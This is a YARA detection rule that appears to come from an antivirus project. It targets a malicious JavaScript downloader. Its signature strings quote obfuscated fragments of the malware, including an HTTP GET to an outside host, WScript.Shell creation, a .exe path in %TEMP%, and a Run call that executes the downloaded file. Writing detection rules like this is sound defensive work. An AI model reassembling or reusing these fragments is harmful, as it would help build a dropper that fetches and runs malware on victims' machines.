rule sig_20160330_8942f92614a9fed90deff4ebc44c6d6b {
  meta:
    description = "datamaliciousorder - file 20160330_8942f92614a9fed90deff4ebc44c6d6b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1e7a6d53670b993ceb3ec8a5eb69d042f75f4361c083a878938242c7bb13a37d"

  strings:
    $s1  = "_DU[_Y](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s2  = "var _LO = function _AT() {return WScript[_E](\"WScript\"+\".Shell\");}(), _J = 11;" fullword ascii
    $s3  = "function _IO(_Q0, _X){_A0 = _A0 * 1; return _Q0 - _X;};" fullword ascii
    $s4  = "if (_DU[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _TN() {return _LO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RhdU7CY3PC3.ex\" + \"e\";};" fullword ascii
    $s6  = "function _CU(){return _FP + \"\";};" fullword ascii
    $s7  = "function _S() {return ((_V == true) && (_V == _AF)) ? 1 : _A0;};" fullword ascii
    $s8  = "function _QU(_XP){_LO[\"Run\"](_XP, _A0, _A0);};" fullword ascii
    $s9  = "function _A()" fullword ascii
    $s10 = "function _K(){return 22;};" fullword ascii
    $s11 = "return _IO(_RK, _G0);" fullword ascii
    $s12 = "function _N(_L) {var _Q = (1, 2, 3, 4, 5, _L); return _Q;};" fullword ascii
    $s13 = " while (_KN){" fullword ascii
    $s14 = "var _UK = new this[\"Date\"]();" fullword ascii
    $s15 = "function _OR(){return _E;};" fullword ascii
    $s16 = "var _AF = false;" fullword ascii
    $s17 = "var _V = false;" fullword ascii
    $s18 = "_V = true; " fullword ascii
    $s19 = "_AF = true; " fullword ascii
    $s20 = "var _RI = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}